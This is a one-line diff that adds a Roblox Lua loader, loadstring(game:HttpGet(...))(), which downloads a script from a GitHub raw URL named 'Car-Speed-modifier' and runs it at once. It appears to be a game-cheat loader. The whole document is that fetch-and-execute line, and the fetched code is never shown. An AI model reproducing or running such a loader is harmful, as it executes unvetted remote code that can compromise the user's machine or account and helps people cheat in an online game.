@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NissanSkyline23/Car-Speed-modifier/main/AC6%20V2"))()
